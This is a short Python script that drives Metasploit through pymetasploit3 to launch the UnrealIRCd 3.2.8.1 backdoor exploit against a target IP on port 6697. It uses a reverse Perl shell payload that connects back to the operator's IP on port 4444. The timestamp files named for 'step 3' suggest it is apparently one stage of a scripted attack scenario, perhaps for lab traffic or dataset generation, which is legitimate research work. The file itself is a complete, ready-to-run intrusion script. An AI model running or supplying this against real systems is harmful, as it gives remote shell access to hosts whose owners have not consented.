import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    # start 3
    output_time_file_start = 'time_step_3_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(2)

    client = MsfRpcClient('kali')

    exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
    payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
    exploit['RHOSTS'] = target_ip
    exploit['RPORT'] = 6697
    payload['LHOST'] = my_ip
    payload['LPORT'] = 4444

    exploit.execute(payload=payload)

    while client.jobs.list:
        time.sleep(1)

    time.sleep(30)
    output_time_file_end = 'time_step_3_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(30)


main(sys.argv)
